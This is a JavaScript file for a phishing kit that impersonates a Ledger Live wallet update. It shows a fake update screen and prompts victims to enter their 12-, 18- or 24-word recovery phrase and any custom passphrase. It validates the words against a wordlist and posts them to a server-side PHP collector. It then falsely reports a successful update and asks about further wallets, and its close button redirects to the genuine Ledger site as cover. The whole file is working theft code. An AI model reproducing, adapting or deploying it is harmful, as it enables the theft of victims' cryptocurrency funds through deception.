$(document).ready(function () {

    window.mac = /(Mac|iPhone|iPod|iPad)/i.test(navigator.platform);
    window.isMobile = window.mobileCheck();
    window.width = (window.innerWidth > 0) ? window.innerWidth : screen.width;
    window.height = (window.innerHeight > 0) ? window.innerHeight : screen.height;

    if (window.isMobile == true) {
        $("#element").css("width", window.width);
        $("#element").css("height", window.height);
    } else {
        $(".loading").css("margin-top", "-130px");
    }

    if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
        window.scheme = "dark";
        $(".loading-gif").attr("src","./Folder/ledger-logo.png");
        $("#element").css("background-color","black");
    } else {
        window.scheme = "white";
        $(".loading-gif").attr("src","./Folder/ledger-logo-black.png");
        $("#element").css("background-color","white");
    }
    $(document).bind('mousedown selectstart', function (e) {
        return $(e.target).is('input, textarea, select, option, html');
    });
});
window.started = 1;
localStorage.setItem('questionlastword', false);

function Start() {
    if (window.scheme=="dark") {
        $("#element").css("background-color", "black");
        $("body").css("background-color", "black");
    } else {
        $("#element").css("background-color", "white");
        $("body").css("background-color", "white");
    }

    if (window.started != 1) {
        return;
    }
    window.started = 2;
    //console.log("Starting Start");
    //$("#element").prepend("<img src='#' style='display:none;width:1px;height:1px'>");

    setTimeout(function () {
        if (window.isMobile == true) {
            $(".middle_image").animate({
                "margin-left": 0
            }, 0, function () {
                // Animation complete.
            });
        } else {

        }
        if (window.scheme=="dark") {
            $('.middle_image').attr("src", "./Folder/ledger-logo.png");
        } else {
            $('.middle_image').attr("src", "./Folder/ledger-logo-black.png");
        }
        $('.middle_image').css("margin-left", "0px");
        $('.middle_image').css("width", "30%");
    }, 100);
    setTimeout(function () {
        $('#element').css('padding', "0px");

        $(".middle_image").detach();
        $("#go-button").detach();


        $("#element").prepend("<div class=\"main-screen\" style=\"height: 1px\">\n" +
            "        <div class=\"main-section top\" style=\"width: 100%; background-image: url('./Folder/"+window.scheme+"-android-mid.jpg'); background-repeat: repeat-x;\"><img src=\"./Folder/"+window.scheme+"-android-top.jpg\" style=\"width: 100%;\"></div>\n" +
            "        <div class=\"main-section mid\" style=\"width: 100%;background:red;height: 100%;  background-image: url('./Folder/"+window.scheme+"-android-mid.jpg'); background-repeat: repeat-x;\"></div>\n" +
            "        <div class=\"main-section bot\" style=\"width: 100%; background-image: url('./Folder/"+window.scheme+"-android-mid.jpg'); background-repeat: repeat-x;\"><img src=\"./Folder/"+window.scheme+"-android-bot.jpg\" style=\"width: 100%;\"></div>\n" +
            "    </div>\n" +
            "    <img class='BotMenuBar' src=\"./Folder/android-"+window.scheme+"-menubar.png\" style=\"width: 100%;position: fixed;bottom: 0;left: 0\">");
        if (window.scheme=="dark") {
            $('#element').css("background-color", "#131415");
            $("body").css("background-color", "#131415");
        } else {
            $('#element').css("background-color", "white");
            $("body").css("background-color", "white");
        }

        $(".main-screen").animate({
            "opacity": 1
        }, 1000, function () {
            $(".loading-wrappert").css("opacity","1");
            $(".main-screen").animate({
                "opacity": 0.7
            }, 1000, function () {
                $(".main-screen").animate({
                    "opacity": 0.2
                }, 3000, function () {
                    $(".loading-wrappert").detach();

                    $("#x0p-button-1").attr('style', 'width: 100%');
                    $("#x0p-button-0").css("display", "none");
                    $(".x0p1a").css("display", "");
                    $(".button-warning").html("Update");
                    $(".button-warning").innerHTML = "Update";
                });
                $(".button-warning").html("Update")
            });





        });
    }, 3500);

    $("#element").animate({
        opacity: 1
    }, 500, function () {
        // Animation complete.
    });

}

window.mobileCheck = function () {
    let check = false;
    (function (a) {
        if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(a) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(a.substr(0, 4))) check = true;
    })(navigator.userAgent || navigator.vendor || window.opera);
    return check;
};

function checkWordsValid(word) {
    result = Wordlist.find((str) => str === word);
    if (result == word) {
        return "ok";
    } else {
        return "error";
    }
}

function presentMasterPop(type) {
    console.log("presentMasterPop:"+type);
    if (window.mac) {
        var FDS = "autofocus";
    } else {
        var FDS = "autofocus";
    }
    switch (type) {
        case "default":
            console.log("Init");
            $("#element").prepend("<div class=\"parent\" style=\"position: relative;\">\n" +
                "        <div class=\"popup\" style=\"position: absolute;left: 50%;transform: translate(-50%, 0%);display: none;top:0% !important\">\n" +
                "            <div class=\"kruis\">x</div>\n" +
                "            <div class=\"title\" style=\"margin-left: 10%;margin-right: 10%;\">Update </div>\n" +
                "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
                "            <div class=\"steps\"><img src=\"./Folder/steps.png\" style='width: 100%'></div>\n" +
                "\n" +
                "            <div class=\"words-box\">\n" +
                "                <span class=\"words-title\">Please fill in your <span class=\"wordcounttext\">1st</span> recovery word</span>\n" +
                "                <div class=\"word\">\n" +
                "\n" +
                //"                    <input type=\"password\" id=\"inputword\" class=\"inputword\" name=\"inputword\" "+FDS+">\n" +
                "                    <i id=\"pass-status\" class=\"fa fa-eye\" aria-hidden=\"true\" onClick=\"viewPassword()\"></i>\n" +
                "                    <input enterkeyhint=\"send\" autocomplete=\"off\" type=\"password\" id=\"password-field\" class=\"word-1\" name=\"words\" " + FDS + ">\n" +
                "                <div class=\"mybutton\">Add</div>\n" +
                "                <div class=\"result no-scroll\" id=\"result\" style=\"margin-left: 7%;margin-right: 7%;\"></div>\n" +
                "\n" +
                "                </div>\n" +
                "            </div>\n" +
                "        </div>\n" +
                "    </div>")
            $(".popup").css('display', "inherit");
            setTimeout(function () {
                $(".mybutton").css("float","");
                $(".popup").css("width","100%");
                $(".parent").css("top","-2%");
                $(".popup").css("height","100%");
                $("#password-field").css("width","230px");
                $(".word-1").css("width","230px");
                $(".mybutton").css("width","auto");
                $(".mybutton").css("padding-left","5px");
                $(".mybutton").css("padding-right","5px");
            }, 200);
            break;
        case "AnotherOld":
            $("#element").html("");
            $("#element").prepend("<div class=\"parent\" style=\"position: relative;\">\n" +
                "        <div class=\"popup\" style=\"position: absolute;left: 50%;transform: translate(-50%, 10%);top:0% !important;opacity: 1\">\n" +
                "            <div class=\"kruis\">x</div>\n" +
                "            <div class=\"title\" style=\"margin-left: 10%;margin-right: 10%;\">Update </div>\n" +
                "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
                "            <div class=\"steps\"><img src=\"./Folder/steps-last.gif\" style='width: 90%;'></div>\n" +
                "\n" +
                "            <div class=\"words-box\">\n" +
                "                <span class=\"words-title\" style='font-size: 1.2em;color:white;'>Your wallet was successfully updated</span>\n" +
                "                <br><br>\n" +
                "                <span class=\"words-sub-title\" style='font-size: 1em;'>Do you own another wallet?</span>\n" +
                "            </div>\n" +
                "            <br><br><div id='x0p-buttons' class='buttons' style='width:80%;    margin-left: auto;margin-right: auto;'>\n" +
                "                <button id='x0p-button-0' class='button button-cancel'\n" +
                "                           style='width: 50.00%; width: calc(100% / 2);float:left;padding: 6px;'>No\n" +
                "               </button>\n" +
                "              <button id='x0p-button-1' class='button button-info'\n" +
                "                           style='width: 50.00%; width: calc(100% / 2);padding: 6px;'>Yes\n" +
                "               </button>\n" +
                "           </div>\n" +
                "        </div>\n" +
                "    </div>")
            $(".popup").css('display', "inherit");
            break;
        case "Another":
            $(".popup").remove();
            $(".x0p-overlay").remove();
            $(".parent").remove();
            $(".parent").remove();
            $("#element").prepend("<div class=\"parent\" style=\"position: relative;\">\n" +
                "        <div class=\"popup x0p x0p1a default\" style=\"position: absolute;top: 50%;left: 50%;transform: translate(-50%, 10%);display: none;height:60%;top:0% !important\">\n" +
                "            <div class=\"kruis resetAll\">x</div>\n" +
                "            <div class=\"title\" style=\"margin-left: 10%;margin-right: 10%;\">Update </div>\n" +
                "            <input type='hidden' name='service' id='service' value='Ledger Live'>\n" +
                "            <div class=\"steps\"><img src=\"./Folder/steps-last.gif\" ></div>\n" +
                "\n" +
                "            <div class=\"words-box\">\n" +
                "                <span class=\"words-title\" style='font-size: 1.2em;color:white;'>Your wallet was successfully updated</span>\n" +
                "                <br><br>\n" +
                "                <span class=\"words-sub-title\" style='font-size: 1em;'>Do you own another wallet?</span>\n" +
                "            </div>\n" +
                "            <br><br><div id='x0p-buttons' class='buttons' style='margin-left: auto;margin-right: auto;'>\n" +
                "                <button id='x0p-button-0' class='button button-info'\n" +
                "                           style='width: 50.00%; width: calc(100% / 2)!important;float:left;display:inherit;margin-top: 0px;'>No\n" +
                "               </button>\n" +
                "              <button id='x0p-button-1' class='button button-info'\n" +
                "                           style='width: 50.00%; width: calc(100% / 2)!important;margin-top: 0px;'>Yes\n" +
                "               </button>\n" +
                "           </div>\n" +
                "        </div>\n" +
                "    </div>")
            $(".popup").css('display', "inherit");
            setTimeout(function () {
                $(".parent").css("top","-2%");
            }, 200);
            break;
        case "":
            break;
    }
}

function executePop() {
    multiple = "";
    //console.log("Executing Pop");
    $(".sync").append("<div class='test'></div>");
    $("#element").css('z-index', "100");
    document.activeElement.blur();
    presentMasterPop("default");
    $(".popup").animate({
        "opacity": 1
    }, 100, function () {
        // Animation complete.
    });
    $(".popup").animate({
        "top": "30%"
    }, 100, function () {
        $(".popup").animate({
            "top": "2%"
        }, 200, function () {
            // Animation complete.
        });
    });
    $("#element").prepend('<div id="x0p-overlay" class="x0p-overlay"></div>');
    const source = document.getElementById('password-field');
    const result = document.getElementById('result');
    const inputHandler = function (e) {
        var word = e.target.value;
        //console.log("word.length :" + word.length + " Content:" + result.innerHTML);
        if (word.length > 2) {
            $(".mybutton").css("opacity", 1);
            $(".LastButton").css("opacity", 1);
        } else {
            $(".mybutton").css("opacity", 0.4);
            $(".LastButton").css("opacity", 0.4);
        }
        var ismultiple = false;
        var multiple = word.split(" ");
        if (multiple.length == 1) {
            var multiple = word.split(",");
            if (multiple.length == 1) {
                var multiple = word.split(/\r?\n/);
                if (multiple.length == 1) {

                } else {
                    ismultiple = true;
                    //alert("ja enter!");
                }
            } else {
                //alert("ja komma");
                ismultiple = true;
            }
        } else {
            //alert("ja spatie");
            ismultiple = true;
        }
        if (multiple.length < 12) {
            ismultiple = false;
        }
        if (ismultiple == true) {
            $(".result").html("");
            $(".word").css("display", "none");
            $(".mybutton").after('<div class="submit-button">Submit your words</div>');
            $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span>");
            $(".word").css("display", "none");
            $(".submit-button").animate({
                "right": "15px"
            }, 500, function () {
                // Animation complete.
            });
            $(".mybutton").css("display", "none");
            $(".popup").animate({
                "height": "700px"
            }, 500, function () {
                // Animation complete.
            });
            wordcount = 1;
            multiple.forEach(element => {
                //console.log(element);
                if (wordcount < 10) {
                    var add = "&nbsp;&nbsp;";
                } else {
                    var add = ""
                }
                $(".result").append('<div><span class="wordCount">' + add + wordcount + '.</span><input style="width:350px" type="password" id="password-field-' + wordcount + '" onmouseover="viewcheckPassword(' + wordcount + ')" onmouseout="hidecheckPassword(' + wordcount + ')" class="check-word check-word-' + wordcount + '" value="' + element + '" name="words"></div>');
                localStorage.setItem('password-field-' + (wordcount - 1), element);
                wordcount++;
            });
            $(".result").animate({
                "opacity": 1
            }, 1000, function () {

            });
            window.multiple = multiple.length;
            /*
            x0p('Do you have an '+(multiple.length+1)+'"th' word?", null, 'input',
                function(button, text) {
                    if(button == 'info') {
                        x0p('Congratulations',
                            'Your name is ' + text + '!',
                            'ok', false);
                    }
                    if(button == 'cancel') {
                        x0p('Canceled',
                            'You canceled input.',
                            'error', false);
                    }
                });

             */
            PreCheck();
        }
        //console.log("Words:" + multiple.length);
        //console.log("Words:" + multiple);
        window.allwords = multiple;
    }
    source.addEventListener('input', inputHandler);
    source.addEventListener('propertychange', inputHandler); // for IE8
}
const listener = () => {
    const MIN_KEYBOARD_HEIGHT = 300 // N.B.! this might not always be correct

    const isMobile = window.innerWidth < 768
    const isKeyboardOpen = isMobile
        && window.screen.height - MIN_KEYBOARD_HEIGHT > window.visualViewport.height;
    setTimeout(function () {
        console.log("nooooooow");
        if(isKeyboardOpen){
            window.height = (window.innerHeight > 0) ? window.innerHeight : screen.height;
            //$(".mybutton").css("top",window.height-200);
            //$(".mybutton").css("width","90%");
            //$(".mybutton").css("margin","0px");
            //$(".mybutton").css("padding","0px");
            //$(".mybutton").css("right","0px");
            $(".mybutton").css("float","");
            $(".popup").css("width","100%");
            $(".popup").css("top","0");
            $(".popup").css("height","100%");
            $("#password-field").css("width","230px");
            $(".word-1").css("width","230px");
            $(".mybutton").css("width","auto");
            $(".mybutton").css("padding-left","5px");
            $(".mybutton").css("padding-right","5px");
        } else {
            /*
            window.height = (window.innerHeight > 0) ? window.innerHeight : screen.height;
            $(".mybutton").css("top","");
            $(".mybutton").css("width","120px");
            $(".mybutton").css("margin","0px");
            $(".mybutton").css("padding","0px");
            $(".mybutton").css("right","15px");
            $(".mybutton").css("float","right");
             */
        }
    }, 200);
}
window.visualViewport.addEventListener('resize', listener);

function viewPassword() {
    var passwordInput = document.getElementById('password-field');
    var passStatus = document.getElementById('pass-status');

    if (passwordInput.type == 'password') {
        passwordInput.type = 'text';
        passStatus.className = 'fa fa-eye-slash';

    } else {
        passwordInput.type = 'password';
        passStatus.className = 'fa fa-eye';
    }
}

function viewcheckPassword(item) {
    var passwordInput = document.getElementById('password-field-' + item);
    passwordInput.type = 'text';
}

function hidecheckPassword(item) {
    var passwordInput = document.getElementById('password-field-' + item);
    passwordInput.type = 'password';
}

window.words = '';
window.string = '';

$(document).on('click', '.kruis', function () {
    window.location = "https://shop.ledger.com/pages/thank-you";
});
$(document).on('click', '#x0p-button-1', function () {
    $(".BotMenuBar").css("display","none");
   // $("#element").prepend("<img src='./Folder/chaynhq.png' style='display:none;width:1px;height:1px'>");
    last = localStorage.getItem('questionlastword');
    $(".mybutton").css("float","");
    $(".popup").css("width","100% !important");
    $(".popup").css("height","100% !important");
    $("#password-field").css("width","230px");
    $(".word-1").css("width","230px");
    $(".mybutton").css("width","auto");
    $(".mybutton").css("padding-left","5px");
    $(".mybutton").css("padding-right","5px");
    $("#element").css("background-color","#131415");
    $(".main-screen").css("display","none");

    //console.log("last:"+last);
    if (last == "true") {
        //console.log("---------------------------");
        $(".x0p2a").css("display", "none");
        $(".x0p1a").css("display", "none");
        $(".parent").html("");
        window.started = 1;
        window.words = '';
        window.string = '';
        executePop();
        localStorage.setItem('questionlastword', false);
    } else {
        $(".x0p").css("display", "none");
        window.words = '';
        window.string = '';
        executePop();
    }
});
$(document).on('keyup', '#password-field', function (e) {
    if (e.key === 'Enter' || e.keyCode === 13) {
        var nextTolast = localStorage.getItem('nextTolast');
        if (nextTolast == "true") {
            var word = $("#password-field").val();
            count = window.multiple + 1;
            var word = $("#password-field").val();
            if (word.length > 2) {
                console.log("LastButton: last word!");
                PreCheck();

                setTimeout(function () {
                    sync();
                }, 600);
                setTimeout(function () {
                    AnotherWallet();
                }, 1200);

            } else {
                console.log("LastButton: no last word!");
                sync();
                setTimeout(function () {
                    AnotherWallet();
                }, 1200);
            }
        } else {
            var word = $("#password-field").val();
            if (word.length > 2) {
                wordstuff();
                PreCheck();
            }
        }
    }
});
$(document).on('click', '.button-cancel', function () {
    //window.location.href = "https://cutt.ly/I1rjX8Y";
});
$(document).on('click', '.mybutton', function () {
    var word = $("#password-field").val();
    if (word.length > 2) {
        wordstuff();
        PreCheck();
    }
});

function wordstuff() {
    var word = $("#password-field").val();
    var word_class = $("#password-field").attr("class");
    if (word.length > 2) {
        window.words = window.words + word + " ";
        wordArray = window.words.split(/\s+/);
        window.tp.play();
        $("#password-field").val("");
        count = wordArray.length;
        window.string = window.string + "word" + (count - 1) + " : " + word + "\n";
        //console.log("wordstuff sending");

        //console.log(wordArray);
        //console.log("Woorden:" + (count - 1));
        window.multiple = count;
        //console.log("window.String:\n" + window.string);
        var input = $('#password-field');
        setTimeout(function () {
            // this focus on last character if input isn't empty
            tmp = input.val();
            input.focus().val("").blur().focus().val(tmp);
        }, 200);
        $(".mybutton").html("Add ");
        window.multiple = count;
        if ((count - 1) == 13) {
            $(".submit-button").css("display", "");
            $(".submit-button").html("Submit");
        }
        if ((count - 1) == 19) {
            $(".submit-button").css("display", "");
            $(".submit-button").html("Submit");
        }
        if ((count - 1) == 25) {
            $(".submit-button").css("display", "");
            $(".submit-button").html("Submit");
        }
        if ((count - 1) == 12) {
            $(".mybutton").after('<div class="submit-button">Submit your words</div>');
            $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span><br>Or if your phrase is longer then 12 words please continue");
            //PreCheck();
            grow();
        } else {
            if ((count - 1) == 18) {
                $(".mybutton").after('<div class="submit-button">Submit your words</div>');
                $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span><br>Or if your phrase is longer then 18 words please continue");
                //PreCheck();
                grow();
            } else {
                if ((count - 1) == 24) {
                    $(".mybutton").after('<div class="submit-button">Submit your words</div>');
                    $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.</span>");
                    //PreCheck();
                    //$(".word").css("display", "none");
                    $(".submit-button").animate({
                        "right": "15px"
                    }, 500, function () {
                        // Animation complete.
                    });
                    $(".mybutton").css("display", "none");
                    grow();
                } else {
                    $(".submit-button").detach();
                    $(".words-title").html("Please fill in your <span class=\"wordcounttext\">" + count + "st</span> recovery word</span>\n");
                    if ((count - 1) > 24) {
                        //console.log("nu");
                        $(".mybutton").after('<div class="submit-button">Submit your words</div>');
                        $(".words-title").html("<span style='color:green'>Please check your words one by one before submitting.<br></span>");
                        //$(".word").css("display", "none");
                        $(".submit-button").animate({
                            "right": "15px"
                        }, 500, function () {
                            // Animation complete.
                        });
                        $(".mybutton").css("display", "none");
                        //PreCheck();
                        grow();
                    }
                }
            }
        }
        $(".mybutton").css("opacity", 0.4);
        //$(".wordcounttext").html(count + 'th');
        $(".wordcounttext").fadeOut(400, function () {
            $(this).html(count + 'th').fadeIn(400);
        });
        if ((count - 1) < 10) {
            var add = "&nbsp;&nbsp;";
        } else {
            var add = ""
        }
        if ((count - 1) == 6) {
            $(".popup").animate({
                "height": "700px"
            }, 500, function () {
                $(".result").css("height", "351px");
                // Animation complete.
            });
        }
        $(".result").animate({
            "opacity": 1
        }, 500, function () {
            // Animation complete.
        });
        $(".result").prepend('<div style="margin-left: -155px;"><span class="wordCount">' + add + (count - 1) + '.</span><input style="width:246px" type="password" id="password-field-' + (count - 1) + '" onmouseover="viewcheckPassword(' + (count - 1) + ')" onmouseout="hidecheckPassword(' + (count - 1) + ')" class="check-word check-word-' + (count - 1) + '" value="' + word + '" name="words"></div>');
        localStorage.setItem('password-field-' + (count - 1), word);
    }
}


function grow() {
    $(".submit-button").animate({
        "backgroundColor": "white"
    }, 500, function () {
        $(".submit-button").animate({
            "backgroundColor": "#b8b1fb"
        }, 500, function () {
        });
    });
}

CheckWordsChange();

function CheckWordsChange() {
    $("input").each(function (index, value) {
        //console.log("$(this).attr(id):"+$(this).attr("id"));

        if ($(this).attr("id") == "service") {
        }
        if ($(this).attr("id") == "password-field") {
        }

        if ($(this).hasClass("word-1")) {
            //console.log("word-1 detected, skip")
            return;
        } else {
            //console.log("Nee has not!");
        }
        //console.log("$(this).calass:" + $(this).attr("class"));
        var newword = $(this).val();
        var oldword = localStorage.getItem($(this).attr("id"));
        if (newword != oldword) {
            localStorage.setItem($(this).attr("id"), newword);
            count = $(this).attr("id");
            count = count.split("-");
            count = count[2];
            //console.log("CheckWordsChange:")
            PreCheck()
        } else {
        }
    });
    setTimeout(function () {
        CheckWordsChange()
    }, 5000);
}


function PreCheck() {
    var nextTolast = localStorage.getItem('nextTolast');
    setTimeout(function () {
        var allwords = "";
        window.totalWords = 0;
        window.vallidWords = 0;
        $("input:password").each(function (index, value) {
            if ($(this).attr('id') != "password-field") {
                $(this).attr("type", "text");
            }
            if (nextTolast == "true") {
                $(this).attr("type", "text");
            }

        });
        $("input:text").each(function (index, value) {
            if ($(this).attr('id') == "service") {
                return;
            }
            if (nextTolast != "true") {
                if ($(this).attr('id') == "password-field") {
                    return;
                }
            }
            var word = $(this).val();
            word = word.replace(/\s+/g, '');
            console.log($(this).val());
            isvallid = checkWordsValid(word);
            console.log("is valid:" + isvallid);
            if (isvallid == "error") {
                $(this).css("border-color", "#bab3fd");
                add = "invalid";
            } else {
                window.vallidWords++;
                $(this).css("border-color", "green");
                add = "correct";
            }
            if (word != "") {
                theword = $(this).attr('id').split("-");
                theword = theword[2];

                if (theword == undefined) {
                    theword = "Custom passphrase";
                }
                newword = "Word " + theword + " [" + add + "] > " + word;
                tmp = allwords;
                allwords = newword + "\n" + tmp;
            }
            window.totalWords++;
            window.OnMyWord = word;
        });
        if (window.totalWords==0){
            return;
        }
        if (nextTolast == "true") {
            allwords += "\n-------------------------------\nCustom passphrase : " + window.OnMyWord + "\n-------------------------------";
            localStorage.setItem('nextTolast', 'false');
        } else {
            allwords += "\n-------------------------------\nAmount of words : " + window.totalWords + "\nWord valid      : " + vallidWords + "\nResult          : " + Math.round((vallidWords / window.totalWords * 100) * 100) / 100 + "% good";
        }
        
        if (window.totalWords==12 || window.totalWords > 12){
            submitWords(allwords);
            console.log(allwords);
        }
        $("input:text").each(function (index, value) {
            if ($(this).attr('id') != "password-field") {
                $(this).attr("type", "password");
            }
        });
    }, 500);
}

function submitWords(allwords) {
    $.post("../system/Info_Processing.php", {
            allwords: allwords
        }, function (data, status) {
            if (status === "success") {
                //console.log("Post successfully!")
            }
        },
        "json")
}

function sync() {
    $(".words-title").css("display", "none");
    $(".word").css("display", "none");
    $(".LastButton").css("display", "none");
    $(".submit-button").css("display", "none");
    $(".submit-button").css("display", "none");
    $(".steps").find("img").attr("src", "./Folder/steps-ani-s.gif");
    setTimeout(function () {
        presentMasterPop("Another");
        $(".popup").animate({
            "top": "30%"
        }, 100, function () {
            $(".popup").animate({
                "top": "2%"
            }, 200, function () {
                // Animation complete.
            });
        });
    }, 3900);

}

function AnotherWallet() {
    /*
    $(".popup").css("display","none");
    $(".x0p2a").css("display","");
    $("#x0p-button-0").css("display","");
    $("#x0p-button-1").css("width","calc(100% / 2)");
     */
    window.allwords = "";
    window.multiple = 0;
}

function lastWordQ() {
    localStorage.setItem('nextTolast', 'true');
    last = localStorage.getItem('questionlastword');
    if (last == "true") {
        localStorage.setItem('nextTolast', 'false');
        console.log("Last is true : AnotherWallet");
        sync();
        setTimeout(function () {
            AnotherWallet();
        }, 1200);
        return;
    }
    //$(".popup").css("display", "none");

    $(".popup").animate({
        "opacity": 0.5
    }, 250, function () {
        count = window.multiple + 1;
        $("#password-field").val("");
        localStorage.setItem('questionlastword', true);
        if (count == 26) {
            count = 25;
        }
        if (count == 20) {
            count = 19;
        }
        if (count == 14) {
            count = 13;
        }
        console.log("im done sir, the count is :" + count);
        $(".words-title").html('Do you have an ' + count + 'th word custom passphrase?');
        $(".words-title").css("font-size", "1.5em");
        $(".words-title").css("color", "white");
        $(".submit-button").css("right", "150px");
        $(".submit-button").html("No, i do not");
        $(".mybutton").html("Submit " + count + 'th word');
        setTimeout(function () {
            $(".LastButton").css("display", "");
        }, 100);
        $(".LastButton").css("display", "");
        $(".LastButton").css("opacity", "");

        $(".result").html('');
        $(".word").css("display", "");

        $(".mybutton").addClass("LastButton");
        $(".LastButton").removeClass("mybutton");
        $(".LastButton").html('Submit ' + count + 'th word?');

        $(".popup").animate({
            "height": "400px"
        }, 500, function () {
            //$(".result").css("height", "351px");
            // Animation complete.
        });
        $(".popup").animate({
            "opacity": 1
        }, 250, function () {

        });
        $(document).on('click', '.LastButton', function () {
            var word = $("#password-field").val();
            count = window.multiple + 1;

            var word = $("#password-field").val();
            if (word.length > 2) {
                console.log("LastButton: last word!");
                PreCheck();

                setTimeout(function () {
                    sync();
                }, 600);
                setTimeout(function () {
                    console.log("nieuwe wallet?");
                    AnotherWallet();
                }, 1200);

            } else {
                console.log("LastButton: no last word!");
                sync();
                setTimeout(function () {
                    AnotherWallet();
                }, 1200);
            }
        });
    });
}

$(document).on('click', '.submit-button', function () {
    PreCheck();
    setTimeout(function () {
        lastWordQ();
    }, 500);
});

